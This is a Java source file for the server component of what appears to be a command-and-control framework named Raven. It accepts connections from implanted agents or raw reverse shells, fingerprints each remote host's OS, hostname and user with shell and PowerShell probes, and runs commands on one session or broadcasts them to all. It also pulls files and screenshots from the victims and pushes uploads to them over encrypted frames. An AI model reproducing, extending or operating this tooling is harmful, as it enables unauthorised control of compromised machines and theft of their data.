package com.raven.core.server;

import com.google.gson.Gson;
import com.raven.core.cryptography.SymmetricCryptography;
import com.raven.core.event.EventManager;
import com.raven.core.event.EventManager.EventType;
import com.raven.core.output.Logger;
import com.raven.core.session.Session;
import com.raven.core.session.SessionManager;
import com.raven.utils.ServerConfig;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.net.SocketTimeoutException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

public abstract class BaseServer {

    protected static final byte[] EndMarker  = "<END>".getBytes(java.nio.charset.StandardCharsets.UTF_8);
    protected static final byte[] MetaMarker = "<META>".getBytes(java.nio.charset.StandardCharsets.UTF_8);
    protected static final Gson Gson = new Gson();
    protected static final int MinFrameBytes = 12 + 16;

    private static final int PeekWindow = 16;
    private static final long PeekTimeoutMs = 2000;
    private static final int ProbeTimeoutMs = 2500;
    private static final int DrainTimeoutMs = 500;
    private static final int RawIdleMs = 800;
    private static final int RawMaxWaitMs = 30_000;

    protected final String Host;
    protected final int Port;
    protected final ListenerMode Mode;
    protected final ServerConfig Config;
    protected final SessionManager Sessions;
    protected final EventManager Events;
    protected volatile boolean Running;

    protected final ConcurrentHashMap<Integer, SymmetricCryptography> SessionCryptos = new ConcurrentHashMap<>();
    protected final ConcurrentHashMap<Integer, Object> CommandLocks = new ConcurrentHashMap<>();
    protected final ConcurrentHashMap<Integer, Object> SocketLocks = new ConcurrentHashMap<>();

    protected BaseServer(String Host, int Port, ListenerMode Mode, ServerConfig Config) {
        this.Host = Host;
        this.Port = Port;
        this.Mode = Mode;
        this.Config = Config;
        this.Sessions = new SessionManager();
        this.Events = new EventManager();
    }

    protected SymmetricCryptography NewSessionCrypto() throws Exception {
        SymmetricCryptography C = new SymmetricCryptography();
        C.GenerateKey();
        return C;
    }

    public abstract boolean[] StartServer();

    public abstract void StopServer();

    public abstract void AcceptConnections();

    public void AddEventListener(EventManager.EventListener L) {
        Events.AddListener(L);
    }

    public enum ConnectionType {
        RAVEN,
        RAW,
        HTTP,
        UNKNOWN
    }

    public static final class DetectionResult {

        public final ConnectionType Type;
        public final PushbackInputStream Stream;
        public final byte[] Peeked;

        DetectionResult(ConnectionType T, PushbackInputStream S, byte[] P) {
            Type = T;
            Stream = S;
            Peeked = P;
        }
    }

    protected DetectionResult Detect(Socket Sock) throws IOException {
        Sock.setSoTimeout((int) PeekTimeoutMs);
        PushbackInputStream PbIn = new PushbackInputStream(Sock.getInputStream(), 512);
        byte[] Peek = new byte[PeekWindow];
        int Read = 0;
        long Dead = System.currentTimeMillis() + PeekTimeoutMs;
        try {
            while (Read < PeekWindow && System.currentTimeMillis() < Dead) {
                int B = PbIn.read();
                if (B == -1) break;
                Peek[Read++] = (byte) B;
            }
        } catch (SocketTimeoutException Ignored) {
        } finally {
            Sock.setSoTimeout(0);
        }
        if (Read == 0) return new DetectionResult(ConnectionType.RAW, PbIn, new byte[0]);
        PbIn.unread(Peek, 0, Read);
        byte[] P = Arrays.copyOf(Peek, Read);
        String Str;
        try {
            Str = new String(P, StandardCharsets.UTF_8).trim();
        } catch (Exception E) {
            Str = "";
        }
        ConnectionType Type;
        if (Str.startsWith("{")) Type = ConnectionType.RAVEN;
        else if (Str.startsWith("GET ") || Str.startsWith("POST ") || Str.startsWith("PUT ") || Str.startsWith("HEAD ")) Type = ConnectionType.HTTP;
        else Type = ConnectionType.RAW;
        Logger.Verbose("Detect [" + Sock.getRemoteSocketAddress() + "] > " + Type + " peek=" + Str.substring(0, Math.min(Str.length(), 12)));
        return new DetectionResult(Type, PbIn, P);
    }

    protected Map<String, Object> RavenHandshake(InputStream In, OutputStream Out, int TimeoutMs, SymmetricCryptography Crypto) throws Exception {
        ByteArrayOutputStream Buf = new ByteArrayOutputStream();
        long Dead = System.currentTimeMillis() + TimeoutMs;
        int Depth = 0;
        boolean InStr = false,
            Esc = false,
            Started = false;
        while (System.currentTimeMillis() < Dead) {
            if (In.available() > 0) {
                int B = In.read();
                if (B == -1) break;
                Buf.write(B);
                char Ch = (char) B;
                if (Esc) Esc = false;
                else if (Ch == '\\' && InStr) Esc = true;
                else if (Ch == '"') InStr = !InStr;
                else if (!InStr) {
                    if (Ch == '{') {
                        Depth++;
                        Started = true;
                    } else if (Ch == '}') Depth--;
                }
                if (Started && Depth == 0) break;
            } else {
                Thread.sleep(30);
            }
        }
        String Json = Buf.toString(StandardCharsets.UTF_8).trim();
        if (!Json.startsWith("{")) throw new IOException("expected JSON sysinfo, got: " + (Json.length() > 64 ? Json.substring(0, 64) + "…" : Json));
        @SuppressWarnings("unchecked")
        Map<String, Object> Info = Gson.fromJson(Json, Map.class);
        for (String F : new String[] { "os", "hostname", "user" }) if (!Info.containsKey(F) || Info.get(F) == null) throw new IOException("Agent JSON missing field: " + F);
        Out.write((Crypto.GetKeyAsBase64Url() + "\n").getBytes(StandardCharsets.UTF_8));
        Out.flush();
        Logger.Verbose("RAVEN handshake OK — " + Info.get("hostname") + " key=" + Crypto.GetKeyAsBase64Url().substring(0, 8) + "…");
        return Info;
    }

    // ── Raw Shell Handshake — OS fingerprinting ─────────────────────────────
    // The probe uses a SPLIT MARKER via shell variable concatenation:
    //   A=RVNOS; B=ID; ... echo $A$B:$OS:$HN:$WH:$AR
    // A PTY shell echoes the raw command text before executing it.
    // The command text contains "$A$B" (unresolved), NOT "RVNOSID:", so the
    // echo of the command never triggers a false marker match.
    // "RVNOSID:" appears ONLY in the actual output after execution.
    //
    // Probe sequence: Linux/POSIX → Windows CMD → PowerShell (only if CMD fails)
    // Each failed attempt drains residual output before the next attempt, so
    // probe responses never bleed into subsequent exec commands.
    // ─────────────────────────────────────────────────────────────────────────
    private static final String MKR_A  = "RVNOS";
    private static final String MKR_B  = "ID";
    private static final String MARKER = MKR_A + MKR_B + ":";

    protected Map<String, Object> RawHandshake(Socket Sock, InputStream In, String RemoteAddr) throws Exception {
        Map<String, Object> Info = new LinkedHashMap<>();
        Info.put("os",           "Unknown");
        Info.put("hostname",     "Unknown");
        Info.put("user",         "Unknown");
        Info.put("architecture", "Unknown");
        Info.put("agentip",      RemoteAddr.replaceAll("/|:.*", ""));
        Info.put("shellmode",    "Raw");

        OutputStream Out = Sock.getOutputStream();
        try {
            // Drain banner/prompt the shell sends on connect
            DrainSocket(Sock, In);

            // ── Linux / POSIX probe ───────────────────────────────────
            // Variable assignments ensure $() substitution runs even in
            // minimal sh/dash/netcat shells.  $A$B in the echo arg means
            // the literal marker never appears in the command echo text.
            String LinuxProbe =
                "A=" + MKR_A + ";B=" + MKR_B + ";" +
                "OS=$(uname -s);" +
                "HN=$(uname -n||hostname);" +
                "WH=$(id -un||whoami);" +
                "AR=$(uname -m);" +
                "echo $A$B:$OS:$HN:$WH:$AR";
            Out.write((LinuxProbe + "\n").getBytes(StandardCharsets.UTF_8));
            Out.flush();

            String LinuxLine = AwaitMarker(Sock, In, MARKER, ProbeTimeoutMs);
            if (LinuxLine != null && IsValidProbeResult(LinuxLine)) {
                ApplyProbeFields(LinuxLine, Info);
                DrainSocket(Sock, In);
                Logger.Info("Raw handshake OK (Linux) — os=" + Info.get("os")
                    + " host=" + Info.get("hostname") + " user=" + Info.get("user"));
                return Info;
            }

            // Drain residual output from failed Linux probe
            DrainSocket(Sock, In);

            // ── Windows CMD probe ─────────────────────────────────────
            String CmdProbe = "cmd /c echo " + MKR_A + MKR_B + ":WIN:%COMPUTERNAME%:%USERNAME%:%PROCESSOR_ARCHITECTURE%";
            Out.write((CmdProbe + "\n").getBytes(StandardCharsets.UTF_8));
            Out.flush();

            String CmdLine = AwaitMarker(Sock, In, MARKER, ProbeTimeoutMs);
            if (CmdLine != null && IsValidProbeResult(CmdLine) && !CmdLine.contains("%")) {
                ApplyProbeFields(CmdLine, Info);
                DrainSocket(Sock, In);
                Logger.Info("Raw handshake OK (Windows/CMD) — host=" + Info.get("hostname")
                    + " user=" + Info.get("user"));
                return Info;
            }

            // Drain before PowerShell — only attempt PS if CMD also failed
            DrainSocket(Sock, In);

            // ── Windows PowerShell probe ──────────────────────────────
            String PsProbe =
                "powershell -NoProfile -Command " +
                "\"Write-Host ('" + MKR_A + MKR_B + ":WIN:'" +
                "+$env:COMPUTERNAME+':'+$env:USERNAME+':'+$env:PROCESSOR_ARCHITECTURE)\"";
            Out.write((PsProbe + "\n").getBytes(StandardCharsets.UTF_8));
            Out.flush();

            String PsLine = AwaitMarker(Sock, In, MARKER, ProbeTimeoutMs);
            if (PsLine != null && IsValidProbeResult(PsLine) && !PsLine.contains("$env")) {
                ApplyProbeFields(PsLine, Info);
                DrainSocket(Sock, In);
                Logger.Info("Raw handshake OK (Windows/PS) — host=" + Info.get("hostname")
                    + " user=" + Info.get("user"));
                return Info;
            }

            // All probes exhausted — drain everything before session starts
            DrainSocket(Sock, In);
            Logger.Warn("raw probe: fingerprint exhausted from " + RemoteAddr + " — Unknown info");

        } catch (Exception E) {
            Logger.Warn("raw probe failed (session still registered): " + E.getMessage());
            try { Sock.setSoTimeout(0); } catch (Exception Ignored) {}
            DrainSocket(Sock, In);
        }

        Logger.Verbose("Raw handshake — host=" + Info.get("hostname")
            + " os=" + Info.get("os") + " user=" + Info.get("user"));
        return Info;
    }

    // Block-read until a line starting with Marker is found, return text after Marker.
    // Uses setSoTimeout (blocking read) — more reliable than available() polling.
    private static String AwaitMarker(Socket Sock, InputStream In,
                                       String Marker, int TimeoutMs) throws Exception {
        Sock.setSoTimeout(TimeoutMs);
        StringBuilder Buf = new StringBuilder(256);
        try {
            int B;
            while ((B = In.read()) != -1) {
                Buf.append((char) B);
                int Idx = Buf.indexOf(Marker);
                if (Idx >= 0) {
                    int End = Buf.indexOf("\n", Idx + Marker.length());
                    if (End > Idx) {
                        String Value = Buf.substring(Idx + Marker.length(), End);
                        return StripAnsi(Value.trim());
                    }
                }
            }
        } catch (SocketTimeoutException Ignored) {
        } finally {
            Sock.setSoTimeout(0);
        }
        return null;
    }

    private static boolean IsValidProbeResult(String R) {
        if (R == null || R.isBlank()) return false;
        if (R.contains("$(")  || R.contains("${"))   return false;
        if (R.contains("$OS") || R.contains("$HN")
         || R.contains("$WH") || R.contains("$AR")
         || R.contains("$A")  || R.contains("$B"))   return false;
        if (R.contains("%COMPUTERNAME%") || R.contains("%USERNAME%")
         || R.contains("%PROCESSOR"))                 return false;
        if (R.contains("$env:"))                     return false;
        if (R.equals("UNK:UNK:UNK:UNK"))            return false;
        return R.contains(":");
    }

    private static void ApplyProbeFields(String Line, Map<String, Object> Info) {
        String[] P = Line.split(":", -1);
        if (P.length >= 1 && !P[0].isBlank()) Info.put("os",           ResolveOs(P[0].trim()));
        if (P.length >= 2 && !P[1].isBlank()) Info.put("hostname",     P[1].trim());
        if (P.length >= 3 && !P[2].isBlank()) Info.put("user",         P[2].trim());
        if (P.length >= 4 && !P[3].isBlank()) Info.put("architecture", P[3].trim());
    }

    private static void DrainSocket(Socket Sock, InputStream In) {
        try {
            Sock.setSoTimeout(DrainTimeoutMs);
            byte[] Drain = new byte[4096];
            try {
                while (In.read(Drain) != -1) {}
            } catch (SocketTimeoutException Ignored) {
            } finally {
                Sock.setSoTimeout(0);
            }
        } catch (Exception Ignored) {}
    }

    private static String ResolveOs(String Raw) {
        if (Raw == null || Raw.isBlank()) return "Unknown";
        String L = Raw.toLowerCase();
        if (L.equals("win") || L.contains("windows") || L.contains("mingw") || L.contains("cygwin")) return "Windows";
        if (L.contains("linux")) return "Linux";
        if (L.contains("darwin")) return "macOS";
        if (L.contains("freebsd") || L.contains("openbsd") || L.contains("netbsd")) return "BSD";
        return Raw;
    }

    protected void MonitorSession(int SessionId, Socket Sock, boolean IsRaw) {
        try {
            Sock.setKeepAlive(true);
        } catch (Exception Ignored) {}
        Thread T = new Thread(() -> {
            while (Running && Sessions.Exists(SessionId)) {
                try {
                    Thread.sleep(15_000);
                    if (!Running || !Sessions.Exists(SessionId)) break;
                    if (Sock.isClosed() || !Sock.isConnected() || Sock.isOutputShutdown()) throw new IOException("Socket closed");
                    if (!IsRaw) {
                        Object SockLock = SocketLocks.get(SessionId);
                        if (SockLock == null) break;
                        SymmetricCryptography Crypto = SessionCryptos.get(SessionId);
                        if (Crypto == null) break;
                        synchronized (SockLock) {
                            try {
                                byte[] Frame = BuildFrame(Crypto, "__PING__".getBytes(StandardCharsets.UTF_8));
                                Sock.getOutputStream().write(Frame);
                                Sock.getOutputStream().flush();
                            } catch (Exception E) {
                                throw new IOException("Heartbeat failed: " + E.getMessage());
                            }
                        }
                    }
                } catch (InterruptedException E) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception E) {
                    Logger.Verbose("session-" + SessionId + " disconnected: " + E.getMessage());
                    Events.Trigger(EventType.AgentDisconnected, EventManager.BuildData("ID", SessionId, "Reason", E.getMessage()));
                    RemoveSession(SessionId);
                    break;
                }
            }
        }, "Monitor-" + SessionId);
        T.setDaemon(true);
        T.start();
    }

    public String[] ExecuteCommand(int SessionId, String Command) {
        Optional<Session> Opt = Sessions.Get(SessionId);
        if (Opt.isEmpty()) return Fail("Session not found");
        Session S = Opt.get();
        Object Lck = CommandLocks.get(SessionId);
        if (Lck == null) return Fail("Session lock missing");

        synchronized (Lck) {
            try {
                String Cmd = Command.trim();
                if (Cmd.isEmpty()) return Fail("Empty command");
                String CmdLow = Cmd.toLowerCase();

                if (CmdLow.startsWith("upload")) return HandleUpload(S, Cmd);
                if (CmdLow.startsWith("download") || CmdLow.startsWith("dl ") || CmdLow.startsWith("screenshot")) return S.IsRawMode() ? Fail("Not supported in raw mode") : SendThenDownload(S, Cmd);

                if (S.IsRawMode()) {
                    Object SLck = SocketLocks.get(SessionId);
                    if (SLck == null) return Fail("Socket lock missing");
                    synchronized (SLck) {
                        S.GetSocket()
                            .getOutputStream()
                            .write((Cmd + "\n").getBytes(StandardCharsets.UTF_8));
                        S.GetSocket().getOutputStream().flush();
                    }
                    byte[] Raw = ReadRawResponse(S.GetSocket());
                    if (Raw == null || Raw.length == 0) return Fail("No response");
                    String Output = CleanRawOutput(new String(Raw, StandardCharsets.UTF_8), Cmd);
                    return new String[] { "true", Output };
                } else {
                    SymmetricCryptography Crypto = SessionCryptos.get(SessionId);
                    if (Crypto == null) return Fail("Session crypto missing");
                    Object SLck = SocketLocks.get(SessionId);
                    if (SLck == null) return Fail("Socket lock missing");
                    byte[] Frame;
                    synchronized (SLck) {
                        Frame = BuildFrame(Crypto, Cmd.getBytes(StandardCharsets.UTF_8));
                        S.GetSocket().getOutputStream().write(Frame);
                        S.GetSocket().getOutputStream().flush();
                    }
                    byte[] Resp = ReadFramedResponse(S.GetSocket(), Config.GetCommandTimeout(), Crypto);
                    if (Resp == null || Resp.length == 0) return Fail("No response from agent");
                    return new String[] { "true", new String(Resp, StandardCharsets.UTF_8) };
                }
            } catch (Exception E) {
                Logger.Error("Command error session-" + SessionId + ": " + E.getMessage());
                RemoveSession(SessionId);
                return Fail("Error: " + E.getMessage());
            }
        }
    }

    private byte[] BuildFrame(SymmetricCryptography Crypto, byte[] Plaintext) throws Exception {
        byte[] Encrypted = Crypto.Encrypt(Plaintext);
        byte[] Frame = new byte[Encrypted.length + EndMarker.length];
        System.arraycopy(Encrypted, 0, Frame, 0, Encrypted.length);
        System.arraycopy(EndMarker, 0, Frame, Encrypted.length, EndMarker.length);
        return Frame;
    }

    protected byte[] ReadFramedResponse(Socket Sock, int TimeoutMs, SymmetricCryptography Crypto) throws IOException {
        Sock.setSoTimeout(TimeoutMs);
        ByteArrayOutputStream Buf = new ByteArrayOutputStream();
        byte[] Tmp = new byte[Config.GetBufferSize()];
        long Dead = System.currentTimeMillis() + TimeoutMs;
        while (System.currentTimeMillis() < Dead) {
            int N;
            try {
                N = Sock.getInputStream().read(Tmp);
            } catch (SocketTimeoutException E) {
                break;
            }
            if (N == -1) break;
            Buf.write(Tmp, 0, N);
            byte[] Cur = Buf.toByteArray();
            if (Cur.length >= MinFrameBytes && EndsWith(Cur, EndMarker)) {
                byte[] Payload = Arrays.copyOf(Cur, Cur.length - EndMarker.length);
                try {
                    byte[] Decrypted = Crypto.Decrypt(Payload);
                    if (new String(Decrypted, StandardCharsets.UTF_8).equals("__PONG__")) {
                        Buf.reset();
                        continue;
                    }
                    Sock.setSoTimeout(0);
                    return Decrypted;
                } catch (Exception E) {
                    Sock.setSoTimeout(0);
                    throw new IOException("Decrypt failed: " + E.getMessage());
                }
            }
        }
        Sock.setSoTimeout(0);
        byte[] Final = Buf.toByteArray();
        if (Final.length >= MinFrameBytes && EndsWith(Final, EndMarker)) {
            byte[] Payload = Arrays.copyOf(Final, Final.length - EndMarker.length);
            try {
                byte[] Decrypted = Crypto.Decrypt(Payload);
                if (new String(Decrypted, StandardCharsets.UTF_8).equals("__PONG__")) return null;
                return Decrypted;
            } catch (Exception E) {
                throw new IOException("Decrypt failed: " + E.getMessage());
            }
        }
        return null;
    }

    public Map<Integer, String[]> BroadcastCommand(List<Integer> SessionIds, String Command) {
        Map<Integer, String[]> Results = new ConcurrentHashMap<>();
        List<CompletableFuture<Void>> Futures = new ArrayList<>();
        for (int Id : SessionIds) {
            CompletableFuture<Void> F = CompletableFuture.runAsync(() -> Results.put(Id, ExecuteCommand(Id, Command)));
            Futures.add(F);
        }
        try {
            CompletableFuture.allOf(Futures.toArray(new CompletableFuture[0])).get(Config.GetCommandTimeout() + 5000, TimeUnit.MILLISECONDS);
        } catch (Exception E) {
            Logger.Warn("Broadcast partial timeout: " + E.getMessage());
        }
        return Results;
    }

    public Map<Integer, String[]> BroadcastAll(String Command) {
        List<Integer> Ids = new ArrayList<>();
        Sessions.GetAll().forEach(S -> Ids.add(S.GetId()));
        return BroadcastCommand(Ids, Command);
    }

    protected byte[] ReadRawResponse(Socket Sock) throws IOException {
        Sock.setSoTimeout(RawIdleMs);
        ByteArrayOutputStream Buf = new ByteArrayOutputStream();
        byte[] Tmp = new byte[Config.GetBufferSize()];
        long Dead = System.currentTimeMillis() + RawMaxWaitMs;
        while (System.currentTimeMillis() < Dead) {
            int N;
            try {
                N = Sock.getInputStream().read(Tmp);
            } catch (SocketTimeoutException E) {
                if (Buf.size() > 0) break;
                continue;
            }
            if (N == -1) break;
            Buf.write(Tmp, 0, N);
        }
        Sock.setSoTimeout(0);
        return Buf.size() > 0 ? Buf.toByteArray() : null;
    }

    protected byte[] ReadResponse(Socket Sock, int TimeoutMs) throws IOException {
        Sock.setSoTimeout(TimeoutMs);
        ByteArrayOutputStream Buf = new ByteArrayOutputStream();
        byte[] Tmp = new byte[Config.GetBufferSize()];
        long Dead = System.currentTimeMillis() + TimeoutMs;
        while (System.currentTimeMillis() < Dead) {
            int N;
            try {
                N = Sock.getInputStream().read(Tmp);
            } catch (SocketTimeoutException E) {
                break;
            }
            if (N == -1) break;
            Buf.write(Tmp, 0, N);
            byte[] Cur = Buf.toByteArray();
            if (Cur.length >= MinFrameBytes && EndsWith(Cur, EndMarker)) return Arrays.copyOf(Cur, Cur.length - EndMarker.length);
        }
        Sock.setSoTimeout(0);
        byte[] Final = Buf.toByteArray();
        if (Final.length >= MinFrameBytes && EndsWith(Final, EndMarker)) return Arrays.copyOf(Final, Final.length - EndMarker.length);
        return Final.length > 0 ? Final : null;
    }

    private String[] HandleUpload(Session S, String Command) {
        if (S.IsRawMode()) return Fail("Upload unsupported in raw mode");
        SymmetricCryptography Crypto = SessionCryptos.get(S.GetId());
        if (Crypto == null) return Fail("Session crypto missing");
        String[] Parts = Command.split("\\s+", 3);
        if (Parts.length < 2) return Fail("Usage: upload <local> [remote]");
        String Local = Parts[1];
        String Remote = Parts.length > 2 ? Parts[2] : "";
        if (!Files.exists(Paths.get(Local))) return Fail("File not found: " + Local);
        try {
            String Name = Paths.get(Local).getFileName().toString();
            Object SLck = SocketLocks.get(S.GetId());
            if (SLck == null) return Fail("Socket lock missing");
            byte[] CmdFrame = BuildFrame(Crypto, (Remote.isEmpty() ? "upload " + Name : "upload " + Remote).getBytes(StandardCharsets.UTF_8));
            OutputStream Out = S.GetSocket().getOutputStream();
            synchronized (SLck) {
                Out.write(CmdFrame);
                Out.flush();
                Thread.sleep(300);
                byte[] Data = Files.readAllBytes(Paths.get(Local));
                Map<String, Object> Meta = new LinkedHashMap<>();
                Meta.put("type", "file");
                Meta.put("filename", Name);
                Meta.put("size", Data.length);
                byte[] MetaEnc = Crypto.Encrypt(Gson.toJson(Meta).getBytes(StandardCharsets.UTF_8));
                Out.write(MetaEnc);
                Out.write(MetaMarker);
                Out.flush();
                Thread.sleep(100);
                Out.write(Data);
                Out.write(EndMarker);
                Out.flush();
            }
            return new String[] { "true", "Uploaded: " + Name };
        } catch (Exception E) {
            return Fail("Upload error: " + E.getMessage());
        }
    }

    private String[] SendThenDownload(Session S, String Command) {
        SymmetricCryptography Crypto = SessionCryptos.get(S.GetId());
        if (Crypto == null) return Fail("Session crypto missing");
        Object SLck = SocketLocks.get(S.GetId());
        if (SLck == null) return Fail("Socket lock missing");
        try {
            byte[] Frame = BuildFrame(Crypto, Command.getBytes(StandardCharsets.UTF_8));
            synchronized (SLck) {
                S.GetSocket().getOutputStream().write(Frame);
                S.GetSocket().getOutputStream().flush();
            }
            return HandleDownload(S, Crypto);
        } catch (Exception E) {
            return Fail("Send error: " + E.getMessage());
        }
    }

    private String[] HandleDownload(Session S, SymmetricCryptography Crypto) {
        try {
            ByteArrayOutputStream Buf = new ByteArrayOutputStream();
            byte[] Tmp = new byte[Config.GetBufferSize()];
            S.GetSocket().setSoTimeout(30_000);
            while (true) {
                int N;
                try {
                    N = S.GetSocket().getInputStream().read(Tmp);
                } catch (SocketTimeoutException E) {
                    break;
                }
                if (N == -1) break;
                Buf.write(Tmp, 0, N);
                byte[] Cur = Buf.toByteArray();
                if (ContainsMarker(Cur, MetaMarker) || EndsWith(Cur, EndMarker)) break;
            }
            S.GetSocket().setSoTimeout(0);
            byte[] Data = Buf.toByteArray();
            int MetaIdx = IndexOf(Data, MetaMarker);
            if (MetaIdx >= 0) {
                byte[] MetaRaw = Arrays.copyOf(Data, MetaIdx);
                byte[] Rest = Arrays.copyOfRange(Data, MetaIdx + MetaMarker.length, Data.length);
                @SuppressWarnings("unchecked")
                Map<String, Object> Meta = Gson.fromJson(Crypto.DecryptString(MetaRaw), Map.class);
                String Filename = (String) Meta.getOrDefault("filename", "received_file");
                ByteArrayOutputStream FileBuf = new ByteArrayOutputStream();
                FileBuf.write(Rest);
                S.GetSocket().setSoTimeout(30_000);
                while (!EndsWith(FileBuf.toByteArray(), EndMarker)) {
                    int N;
                    try {
                        N = S.GetSocket().getInputStream().read(Tmp);
                    } catch (SocketTimeoutException E) {
                        break;
                    }
                    if (N == -1) break;
                    FileBuf.write(Tmp, 0, N);
                }
                S.GetSocket().setSoTimeout(0);
                byte[] FileData = FileBuf.toByteArray();
                if (EndsWith(FileData, EndMarker)) FileData = Arrays.copyOf(FileData, FileData.length - EndMarker.length);
                String Saved = SaveFile(Filename, FileData, S.GetId());
                return Saved != null ? new String[] { "true", "Saved: " + Saved } : Fail("Failed to save file");
            }
            if (EndsWith(Data, EndMarker)) Data = Arrays.copyOf(Data, Data.length - EndMarker.length);
            return new String[] { "true", Crypto.DecryptString(Data) };
        } catch (Exception E) {
            return Fail("Download error: " + E.getMessage());
        }
    }

    protected String SaveFile(String Filename, byte[] Data, int SessionId) {
        try {
            Path Dir = Paths.get("Downloads/Session_" + SessionId);
            Files.createDirectories(Dir);
            String Base = Filename,
                Ext = "";
            int Dot = Filename.lastIndexOf('.');
            if (Dot > 0) {
                Base = Filename.substring(0, Dot);
                Ext = Filename.substring(Dot);
            }
            Path Target = Dir.resolve(Filename);
            for (int I = 1; Files.exists(Target); I++) Target = Dir.resolve(Base + "_" + I + Ext);
            Files.write(Target, Data);
            return Target.toString();
        } catch (IOException E) {
            Logger.Error("SaveFile failed: " + E.getMessage());
            return null;
        }
    }

    private static String StripAnsi(String Input) {
        return Input.replaceAll("\u001B\\[[;\\d?]*[A-Za-z]|\u001B[=>]|\r|\u0007", "").trim();
    }

    private static boolean IsShellPrompt(String Line) {
        if (Line.isEmpty() || Line.length() > 150) return false;
        if (Line.matches("^[\\w][\\w.\\-]*(\\(\\w+\\))?\\s*[#$]\\s*$")) return true;
        if (Line.matches("^.*@.*[#$]\\s*$")) return true;
        if (Line.matches("^\\[.*\\][#$]\\s*$")) return true;
        if (Line.matches("^PS [A-Za-z]:\\\\.*>\\s*$")) return true;
        if (Line.matches("^[A-Za-z]:\\\\.*>\\s*$")) return true;
        return false;
    }

    private static String CleanRawOutput(String Raw, String SentCommand) {
        String Clean = StripAnsi(Raw);
        String[] Lines = Clean.split("\r?\n", -1);
        List<String> Kept = new ArrayList<>();
        String CmdTrimmed = SentCommand.trim();
        boolean EchoSkipped = false;
        for (String Line : Lines) {
            String Stripped = Line.stripTrailing();
            if (!EchoSkipped && Stripped.trim().equals(CmdTrimmed)) {
                EchoSkipped = true;
                continue;
            }
            if (IsShellPrompt(Stripped.trim())) continue;
            Kept.add(Stripped);
        }
        while (!Kept.isEmpty() && Kept.get(Kept.size() - 1).isBlank()) Kept.remove(Kept.size() - 1);
        while (!Kept.isEmpty() && Kept.get(0).isBlank()) Kept.remove(0);
        return String.join("\n", Kept);
    }

    public void RemoveSession(int SessionId) {
        Sessions.Remove(SessionId);
        CommandLocks.remove(SessionId);
        SocketLocks.remove(SessionId);
        SessionCryptos.remove(SessionId);
        Events.Trigger(EventType.AgentRemoved, EventManager.BuildData("ID", SessionId));
    }

    public String GetKeyBase64() {
        if (SessionCryptos.isEmpty()) return "(no active sessions)";
        return SessionCryptos.values().iterator().next().GetKeyAsBase64Url();
    }

    public SymmetricCryptography GetSessionCrypto(int SessionId) {
        return SessionCryptos.get(SessionId);
    }

    public SessionManager GetSessions() {
        return Sessions;
    }

    public EventManager GetEvents() {
        return Events;
    }

    public ListenerMode GetMode() {
        return Mode;
    }

    public String GetHost() {
        return Host;
    }

    public int GetPort() {
        return Port;
    }

    public boolean IsRunning() {
        return Running;
    }

    protected static String[] Fail(String Msg) {
        return new String[] { "false", Msg };
    }

    protected boolean EndsWith(byte[] Data, byte[] Suffix) {
        if (Data.length < Suffix.length) return false;
        for (int I = 0; I < Suffix.length; I++) if (Data[Data.length - Suffix.length + I] != Suffix[I]) return false;
        return true;
    }

    protected boolean ContainsMarker(byte[] Data, byte[] Marker) {
        return IndexOf(Data, Marker) >= 0;
    }

    protected int IndexOf(byte[] Data, byte[] Pat) {
        outer: for (int I = 0; I <= Data.length - Pat.length; I++) {
            for (int J = 0; J < Pat.length; J++) if (Data[I + J] != Pat[J]) continue outer;
            return I;
        }
        return -1;
    }
}
